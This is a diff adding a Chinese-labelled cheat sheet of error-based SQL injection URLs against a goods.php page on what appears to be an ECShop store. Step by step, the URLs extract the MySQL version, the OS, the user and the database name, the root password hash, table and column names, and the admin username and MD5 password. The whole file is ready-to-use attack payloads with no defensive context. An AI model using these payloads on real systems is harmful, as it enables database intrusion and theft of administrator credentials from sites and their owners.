@@ -1,0 +1,46 @@
+判断版本号
+http://www.baiud.com/goods.php?id=352&wsid=1%20and%20(1,1)%3E(select%20count(*),concat((select%20@@version%20),0x3a,floor(rand()*2))%20x%20from%20(select%201%20union%20select%202)%20a%20group%20by%20x%20limit%201)%23
+
+判断系统
+
+http://www.baiud.com/goods.php?id=352&wsid=1%20and%20(1,1)%3E(select%20count(*),concat((select%20@@version_compile_os%20),0x3a,floor(rand()*2))%20x%20from%20(select%201%20union%20select%202)%20a%20group%20by%20x%20limit%201)%23
+
+
+
+当前 user()
+
+http://www.baiud.com/goods.php?id=352&wsid=1%20and%20(1,1)%3E(select%20count(*),concat((select%20user()%20),0x3a,floor(rand()*2))%20x%20from%20(select%201%20union%20select%202)%20a%20group%20by%20x%20limit%201)%23
+
+
+
+当前 database()
+http://www.baiud.com/goods.php?id=352&wsid=1%20and%20(1,1)%3E(select%20count(*),concat((select%20database()%20),0x3a,floor(rand()*2))%20x%20from%20(select%201%20union%20select%202)%20a%20group%20by%20x%20limit%201)%23
+
+
+
+
+root hash
+
+http://www.baiud.com/goods.php?id=352&wsid=1%20and%20(1,1)%3E(select%20count(*),concat((select%20Password%20from%20mysql.user%20where%20User=char(114,111,111,116)),0x3a,floor(rand()*2))%20x%20from%20(select%201%20union%20select%202)%20a%20group%20by%20x%20limit%201)%23
+
+
+
+当前 数据库表名
+
+http://www.baiud.com/goods.php?id=352&wsid=1%20and%20(1,1)%3E(select%20count(*),concat((select%20TABLE_NAME%20%20from%20information_schema.tables%20where%20TABLE_SCHEMA=char(115,97,110,115,97,110,49)%20limit%206,1),0x3a,floor(rand()*2))%20x%20from%20(select%201%20union%20select%202)%20a%20group%20by%20x%20limit%201)%23
+
+
+
+当前 数据库 user_name 字段
+
+http://www.baiud.com/goods.php?id=352&wsid=1%20and%20(1,1)%3E(select%20count(*),concat((select%20%20COLUMN_NAME%20from%20information_schema.COLUMNS%20where%20TABLE_SCHEMA=char(115,97,110,115,97,110,49)%20and%20TABLE_NAME=char(101,99,115,95,97,100,109,105,110,95,117,115,101,114)%20limit%202,1),0x3a,floor(rand()*2))%20x%20from%20(select%201%20union%20select%202)%20a%20group%20by%20x%20limit%201)%23
+
+当前 数据库 字段 password
+http://www.baiud.com/goods.php?id=352&wsid=1%20and%20(1,1)%3E(select%20count(*),concat((select%20%20COLUMN_NAME%20from%20information_schema.COLUMNS%20where%20TABLE_SCHEMA=char(115,97,110,115,97,110,49)%20and%20TABLE_NAME=char(101,99,115,95,97,100,109,105,110,95,117,115,101,114)%20limit%204,1),0x3a,floor(rand()*2))%20x%20from%20(select%201%20union%20select%202)%20a%20group%20by%20x%20limit%201)%23
+
+
+
+获得 admin passwd(md5)
+
+
+http://www.baiud.com/goods.php?id=352&wsid=1%20and%20(1,1)%3E(select%20count(*),concat((select%20concat_ws(char(94),ifnull(cast(%60password%60%20as%20char),char(32)),ifnull(cast(%60user_name%60%20as%20char),char(32)))%20%20from%20sansan1.ecs_admin_user%20limit%200,1),0x3a,floor(rand()*2))%20x%20from%20(select%201%20union%20select%202)%20a%20group%20by%20x%20limit%201)%23
